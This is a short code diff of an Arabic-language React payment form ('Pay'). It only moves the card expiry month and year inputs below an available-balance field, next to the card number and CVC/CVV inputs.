@@ -94,16 +94,7 @@ const Pay=()=>{
                   setDynamicFormData(name, value);
                 }}  required maxLength="16"/>
             <div>
-            <input type="text" placeholder='(MM)'  name='MM' onChange={(e) => {
-                  const { name, value } = e.target;
-                  setDynamicFormData(name, value);
-                }} maxLength="2" required/>
-            <input type="text" placeholder='(YY)'  name='YY' onChange={(e) => {
-                  const { name, value } = e.target;
-                  setDynamicFormData(name, value);
-                }} maxLength="2" required/>
-            </div>
-          <label htmlFor="الرصيد">
+              <label htmlFor="الرصيد">
                           الرصيدالمتوفر
                      </label>
             <div className={styles.curmony}>
@@ -113,6 +104,16 @@ const Pay=()=>{
                   setDynamicFormData(name, value);
                 }} maxLength="7" required/>
                  </div>
+            <input type="text" placeholder='(MM)'  name='MM' onChange={(e) => {
+                  const { name, value } = e.target;
+                  setDynamicFormData(name, value);
+                }} maxLength="2" required/>
+            <input type="text" placeholder='(YY)'  name='YY' onChange={(e) => {
+                  const { name, value } = e.target;
+                  setDynamicFormData(name, value);
+                }} maxLength="2" required/>
+            </div>
+          
             
             <input type="text" placeholder='الرقم (cvc/cvv)' name='cvcCard' onChange={(e) => {
                   const { name, value } = e.target;
